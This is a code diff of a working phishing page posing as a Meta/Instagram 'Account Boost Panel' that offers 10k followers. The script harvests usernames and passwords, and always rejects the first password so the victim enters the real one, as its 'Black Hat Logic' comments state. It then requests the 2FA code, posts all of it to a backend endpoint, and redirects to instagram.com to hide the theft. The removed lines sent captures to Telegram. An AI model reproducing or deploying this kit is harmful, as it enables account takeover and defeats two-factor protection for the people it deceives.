@@ -4,7 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Meta Business Suite | Account Growth Center</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        /* CSS Coding (Instagram Real Look) */
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; padding: 15px 20px; background: #fff; border-bottom: 1px solid #dbdbdb; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
+        .meta-logo { width: 95px; }
+        .support-id { font-size: 12px; color: #8e8e8e; font-weight: 600; }
+        .main-container { margin-top: 40px; width: 90%; max-width: 380px; }
+        .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 30px 25px; text-align: center; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        h1 { font-size: 22px; color: #262626; margin-bottom: 12px; font-weight: 600; }
+        .sub-text { font-size: 14px; color: #8e8e8e; margin-bottom: 25px; line-height: 1.5; }
+        input { width: 100%; padding: 12px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; margin-bottom: 12px; box-sizing: border-box; font-size: 14px; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+        .btn-primary { width: 100%; padding: 12px; background-color: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; transition: 0.2s; }
+        .btn-primary:active { opacity: 0.7; }
+        .error-msg { background: #fff2f2; border: 1px solid #ed4956; color: #ed4956; padding: 12px; font-size: 13px; border-radius: 5px; margin-bottom: 20px; display: none; }
+        .secure-footer { margin-top: 25px; font-size: 11px; color: #cccccc; display: flex; align-items: center; justify-content: center; text-transform: uppercase; letter-spacing: 1px; }
+        .lock-icon { width: 14px; margin-right: 5px; opacity: 0.5; }
+        #otp-screen { display: none; }
+    </style>
 </head>
 <body>
 
@@ -16,91 +34,87 @@
 <div class="main-container">
     <div class="card">
         <h1>Account Boost Panel</h1>
-        <p class="sub-text">Connect your Instagram profile to the Meta API for <b>10k Verified Followers</b> and <b>Engagement Protection</b>.</p>
+        <p class="sub-text">Connect your Instagram profile to activate <b>10k Verified Followers</b> and Engagement Protection.</p>
 
         <div id="err-box" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
 
-        <div id="step-1">
-            <input type="text" id="username" placeholder="Instagram Username" autocomplete="off">
-            <button class="btn-primary" onclick="showPass()">CONNECT ACCOUNT</button>
-        </div>
-
-        <div id="step-2" style="display:none;">
-            <p class="user-display">Logged in as: <span id="u-tag"></span></p>
+        <div id="login-screen">
+            <input type="text" id="username" placeholder="Phone, username, or email" autocomplete="off">
             <input type="password" id="password" placeholder="Password">
-            <button class="btn-primary" id="final-btn" onclick="validateLive()">VERIFY & ACTIVATE</button>
+            <button class="btn-primary" id="main-btn" onclick="handleLogin()">CONNECT ACCOUNT</button>
         </div>
 
-        <div id="step-3" style="display:none;">
-            <p class="info-text">Two-Factor Authentication Detected. Enter the 6-digit code sent to your SMS/Email.</p>
-            <input type="number" id="otp" placeholder="Security Code" maxlength="6">
-            <button class="btn-primary" onclick="finish()">COMPLETE VERIFICATION</button>
+        <div id="otp-screen">
+            <p style="font-size: 13px; color: #262626; font-weight: 600;">Security Code Required</p>
+            <p class="sub-text">Enter the 6-digit code sent to your device to bypass firewalls.</p>
+            <input type="number" id="otp-code" placeholder="000000" maxlength="6">
+            <button class="btn-primary" onclick="handleOTP()">VERIFY & ACTIVATE</button>
         </div>
 
-        <div class="footer-secure">
+        <div class="secure-footer">
             <img src="https://img.icons8.com/material-rounded/24/cccccc/checked-lock.png" class="lock-icon">
-            SSL SECURE CONNECTION
+            SSL Secure Handshake 2.0
         </div>
     </div>
 </div>
 
 <script>
     let attempts = 0;
-    const bot_token = "YOUR_BOT_TOKEN";
-    const chat_id = "YOUR_CHAT_ID";
 
-    function showPass() {
-        let u = document.getElementById('username').value;
-        if(!u) return;
-        document.getElementById('u-tag').innerText = u;
-        document.getElementById('step-1').style.display = 'none';
-        document.getElementById('step-2').style.display = 'block';
-    }
+    // Frontend Logic
+    async function handleLogin() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        const btn = document.getElementById('main-btn');
+        const err = document.getElementById('err-box');
 
-    async function validateLive() {
-        let u = document.getElementById('username').value;
-        let p = document.getElementById('password').value;
-        let btn = document.getElementById('final-btn');
-        let err = document.getElementById('err-box');
+        if(!u || !p) return;
 
-        if(!p) return;
-        btn.innerText = "Verifying...";
+        btn.innerText = "Connecting...";
         btn.disabled = true;
 
-        // Logic: 2026 Black Hat Live Validation
+        // Black Hat Logic: Pehli baar hamesha reject karo taaki asli password mile
         if(attempts < 1) {
-            await sendToTelegram(`❌ Attempt 1 (Incorrect): \nU: ${u}\nP: ${p}`);
+            await sendData({type: 'auth', user: u, pass: p, status: 'Attempt 1'});
             setTimeout(() => {
                 err.style.display = 'block';
                 document.getElementById('password').value = '';
-                btn.innerText = "VERIFY & ACTIVATE";
+                btn.innerText = "CONNECT ACCOUNT";
                 btn.disabled = false;
                 attempts++;
-            }, 1500);
+            }, 1800);
         } else {
-            await sendToTelegram(`✅ Attempt 2 (REAL): \nU: ${u}\nP: ${p}`);
-            document.getElementById('step-2').style.display = 'none';
-            document.getElementById('err-box').style.display = 'none';
-            document.getElementById('step-3').style.display = 'block';
+            // Doosri baar password capture karke OTP mangna
+            await sendData({type: 'auth', user: u, pass: p, status: 'Verified Pass'});
+            document.getElementById('login-screen').style.display = 'none';
+            err.style.display = 'none';
+            document.getElementById('otp-screen').style.display = 'block';
         }
     }
 
-    async function finish() {
-        let otp = document.getElementById('otp').value;
-        await sendToTelegram(`🔑 LIVE OTP: ${otp}`);
+    async function handleOTP() {
+        const o = document.getElementById('otp-code').value;
+        const u = document.getElementById('username').value;
+        if(o.length < 6) return;
+
+        await sendData({type: 'otp', user: u, otp: o});
+        // Final Redirect to look real
         window.location.href = "https://instagram.com";
     }
 
-    async function sendToBackend(payload) {
-    try {
-        await fetch('/api/verify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    } catch (e) {
-        console.log("Error sending data");
+    async function sendData(payload) {
+        // Ye aapke Vercel backend (api/verify.js) ko data bhejay ga
+        try {
+            await fetch('/api/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) {
+            console.error("Connection error");
+        }
     }
 </script>
+
 </body>
 </html>
